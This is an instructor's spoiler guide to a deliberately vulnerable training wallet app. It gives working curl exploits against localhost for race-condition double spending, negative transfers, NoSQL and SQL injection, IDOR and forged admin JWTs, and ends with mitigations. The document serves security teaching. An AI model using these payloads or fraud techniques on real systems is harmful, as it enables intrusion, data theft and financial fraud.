# Vulnerability Guide for Security Training Lab

**WARNING: This document contains spoilers for the security training lab. Only share with instructors.**

## Overview

This application contains intentional security vulnerabilities across multiple layers for educational purposes. This guide documents each vulnerability, its location, and how to exploit it.

---

## Layer 3: Business Logic Flaws

### 1. Race Condition in Transfer (CRITICAL)

**Location:** `backend/server.js` - `/api/wallet/transfer` endpoint

**Vulnerability:** The transfer endpoint uses a "check-then-act" pattern with a 2-second delay between checking balance and deducting it.

**Exploitation:**
1. User A has $100 balance
2. Send two simultaneous transfer requests of $100 each to different users
3. Both requests pass the balance check before either deducts
4. User A sends $200 total while only having $100

```bash
# Send two requests simultaneously
curl -X POST http://localhost:3001/api/wallet/transfer \
  -H "Authorization: Bearer <token>" \
  -H "Content-Type: application/json" \
  -d '{"toUserId": "user2", "amount": 100}' &

curl -X POST http://localhost:3001/api/wallet/transfer \
  -H "Authorization: Bearer <token>" \
  -H "Content-Type: application/json" \
  -d '{"toUserId": "user3", "amount": 100}' &
```

### 2. Negative Amount Transfer (CRITICAL)

**Location:** `backend/server.js` - `/api/wallet/transfer` endpoint

**Vulnerability:** No validation ensures the transfer amount is positive.

**Exploitation:**
```bash
curl -X POST http://localhost:3001/api/wallet/transfer \
  -H "Authorization: Bearer <token>" \
  -H "Content-Type: application/json" \
  -d '{"toUserId": "victim", "amount": -1000000}'
```

This adds $1,000,000 to the sender's balance instead of deducting it.

### 3. Rounding Error / Salami Attack (MEDIUM)

**Location:** `backend/server.js` - tax calculation in transfer

**Vulnerability:** Tax calculation uses `Math.floor()` which rounds down, allowing accumulation of fractional cents.

**Exploitation:**
Make many small transfers where the tax rounds down to 0:
```bash
# Transfer $0.01 multiple times - tax rounds to 0
for i in {1..1000}; do
  curl -X POST http://localhost:3001/api/wallet/transfer \
    -H "Authorization: Bearer <token>" \
    -d '{"toUserId": "recipient", "amount": 0.01}'
done
```

### 4. Negative Deposit (HIGH)

**Location:** `backend/server.js` - `/api/wallet/deposit` endpoint

**Vulnerability:** No validation ensures deposit amount is positive.

**Exploitation:**
```bash
curl -X POST http://localhost:3001/api/wallet/deposit \
  -H "Authorization: Bearer <token>" \
  -H "Content-Type: application/json" \
  -d '{"amount": -500}'
```

This effectively withdraws money without proper authorization.

### 5. JWT Role Trust Without DB Verification (HIGH)

**Location:** All admin endpoints (`/api/admin/*`)

**Vulnerability:** Admin endpoints only check the `role` claim in the JWT without verifying against the database.

**Exploitation:**
1. Login as a regular user
2. Decode the JWT and modify `role` from "user" to "admin"
3. Re-sign with the hardcoded secret
4. Access admin endpoints

```bash
# Access admin users endpoint with modified JWT
curl http://localhost:3001/api/admin/users \
  -H "Authorization: Bearer <modified-jwt>"
```

---

## Layer 4: Data Access & Privacy

### 6. IDOR - Insecure Direct Object Reference (HIGH)

**Location:** `backend/server.js` - `/api/transactions/:id`

**Vulnerability:** The endpoint only checks if the user is logged in, not if they own the transaction.

**Exploitation:**
```bash
# Access any transaction by ID
curl http://localhost:3001/api/transactions/1 \
  -H "Authorization: Bearer <any-valid-token>"

curl http://localhost:3001/api/transactions/2 \
  -H "Authorization: Bearer <any-valid-token>"
```

Iterate through IDs to see other users' transactions.

### 7. NoSQL Injection (CRITICAL)

**Location:** `backend/server.js` - `/api/auth/users/search` and `/api/wallet/search`

**Vulnerability:** Direct use of `req.query` in MongoDB `.find()` without sanitization.

**Exploitation:**
```bash
# Extract all users using NoSQL injection
curl "http://localhost:3001/api/auth/users/search?email[%24gt]=&email[%24lt]=z" \
  -H "Authorization: Bearer <token>"

# Find admin users
curl "http://localhost:3001/api/auth/users/search?role=admin" \
  -H "Authorization: Bearer <token>"

# Extract all wallets
curl "http://localhost:3001/api/wallet/search?balance[%24gte]=0" \
  -H "Authorization: Bearer <token>"
```

### 8. SQL Injection (CRITICAL)

**Location:** `backend/server.js` - `/api/transactions/search` and `/api/transactions/stats/summary`

**Vulnerability:** String concatenation in SQL queries without parameterization.

**Exploitation:**
```bash
# SQL Injection in type parameter
curl "http://localhost:3001/api/transactions/search?type=' OR '1'='1" \
  -H "Authorization: Bearer <token>"

# Extract data via UNION
curl "http://localhost:3001/api/transactions/search?type=' UNION SELECT * FROM pg_user--" \
  -H "Authorization: Bearer <token>"

# SQL Injection in date parameter
curl "http://localhost:3001/api/transactions/stats/summary?startDate=2024-01-01' OR '1'='1" \
  -H "Authorization: Bearer <token>"

# Extract database version
curl "http://localhost:3001/api/transactions/search?type=' UNION SELECT version(),NULL,NULL,NULL,NULL,NULL,NULL--" \
  -H "Authorization: Bearer <token>"
```

---

## Layer 6: Sensitive Data Exposure

### 9. Sensitive Data in Logs (HIGH)

**Location:** `backend/server.js` - `logError` function

**Vulnerability:** Error logs include full request body with passwords and PII.

**Exploitation:**
Trigger any error and check the container logs:
```bash
docker-compose logs -f backend
```

Then trigger an error:
```bash
# This will log the password in plain text
curl -X POST http://localhost:3001/api/auth/register \
  -H "Content-Type: application/json" \
  -d '{"email": "test@test.com", "password": "SuperSecret123!"}'
```

Check logs to see the password logged.

---

## Layer 7: Security Misconfiguration

### 10. Missing Security Headers (MEDIUM)

**Location:** `backend/server.js`

**Vulnerability:** No security headers implemented (CSP, HSTS, X-Frame-Options, X-Content-Type-Options, etc.)

**Verification:**
```bash
curl -I http://localhost:3001/api/auth/login
```

Notice the absence of:
- Content-Security-Policy
- Strict-Transport-Security
- X-Frame-Options
- X-Content-Type-Options
- X-XSS-Protection

---

## Layer 8: Authentication & Authorization

### 11. Hardcoded JWT Secret (CRITICAL)

**Location:** `backend/server.js` - line 12

**Vulnerability:** JWT secret is hardcoded as `'super-secret-key-123'`

**Exploitation:**
1. Extract any JWT from the application
2. Decode it to get the payload structure
3. Modify the payload (e.g., change role to "admin")
4. Sign with the known secret:

```javascript
const jwt = require('jsonwebtoken');
const token = jwt.sign({
  userId: '...',
  email: 'user@example.com',
  role: 'admin'
}, 'super-secret-key-123', { expiresIn: '365d' });
```

### 12. Long JWT Expiration (MEDIUM)

**Location:** `backend/server.js` - login endpoint

**Vulnerability:** JWTs expire after 1 year (365 days).

**Impact:** Stolen tokens remain valid for a very long time, increasing the window of opportunity for attackers.

---

## Layer 9: Software Supply Chain

### 13. Outdated Dependencies with Known CVEs (HIGH)

**Location:** `backend/package.json`

**Vulnerable Packages:**
- `axios@0.27.2` - Known vulnerabilities (CVE-2023-45857, CVE-2021-3749)
- `lodash@4.17.15` - Prototype pollution vulnerabilities (CVE-2020-8203, CVE-2019-10744)
- `jsonwebtoken@8.5.1` - Known vulnerabilities (CVE-2022-23529, CVE-2022-23530)

**Verification:**
```bash
cd backend && npm audit
```

---

## Layer 10: Infrastructure

### 14. Outdated Database Versions (MEDIUM)

**Location:** `docker-compose.yml`

**Vulnerability:** Using outdated versions of MongoDB (4.4.18) and PostgreSQL (12.15) with known security issues.

---

## Exploitation Scenarios

### Scenario 1: Account Takeover & Privilege Escalation
1. Login as a regular user
2. Decode your JWT to understand the structure
3. Modify the JWT to change role to "admin" using the hardcoded secret
4. Access all admin endpoints to view all users, wallets, and transactions

### Scenario 2: Financial Fraud - Unlimited Money
**Method A - Negative Transfer:**
```bash
curl -X POST http://localhost:3001/api/wallet/transfer \
  -H "Authorization: Bearer <token>" \
  -d '{"toUserId": "any-user", "amount": -999999999}'
```

**Method B - Race Condition:**
Send multiple simultaneous transfer requests to double-spend.

**Method C - Salami Attack:**
Make thousands of $0.01 transfers to accumulate rounding errors.

### Scenario 3: Data Breach
1. Use NoSQL injection to extract all user data
2. Use SQL injection to extract all transaction data
3. Use IDOR to iterate through transaction IDs
4. Check logs for password exposure

---

## Mitigation Strategies

### Layer 3
- Use database transactions with proper locking for transfers
- Validate all input amounts are positive
- Use integer arithmetic (cents) instead of floating point
- Always verify roles against the database

### Layer 4
- Implement proper authorization checks for all resources
- Use parameterized queries/prepared statements
- Sanitize all user input before using in database queries
- Implement proper access control lists

### Layer 6
- Never log sensitive data (passwords, tokens, PII)
- Use structured logging with data classification
- Implement log redaction for sensitive fields

### Layer 7
- Implement security headers middleware:
  ```javascript
  app.use(helmet());
  ```

### Layer 8
- Use strong, randomly generated JWT secrets from environment variables
- Set short JWT expiration (15-30 minutes) with refresh tokens
- Always verify user roles against the database for sensitive operations

### Layer 9
- Regularly update dependencies
- Use `npm audit` and automated tools like Dependabot
- Pin dependency versions and review changes

### Layer 10
- Use latest stable versions of databases
- Regularly apply security patches
- Follow security advisories for infrastructure components
